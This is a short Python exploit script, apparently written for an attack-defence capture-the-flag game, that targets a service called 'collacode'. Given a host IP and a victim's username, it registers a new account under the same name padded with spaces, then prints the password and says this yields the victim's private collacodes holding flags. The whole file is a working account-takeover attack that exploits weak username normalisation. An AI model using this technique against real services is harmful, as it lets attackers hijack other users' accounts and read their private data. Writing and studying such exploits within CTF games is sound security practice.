import sys
import json

from collacode_lib import *
from checker import Checker

from diff_match_patch import diff_match_patch


if len(sys.argv) < 3:
	print(f'Usage: {sys.argv[0]} ip username')
	exit(0)

ip = sys.argv[1]
username = sys.argv[2]

c = Checker(ip)

mch = CheckMachine(c)
_, p = mch.register(' ' + username + ' ')

print(f'Login with password: {p} and get {username}\'s private collacodes with flags in them')
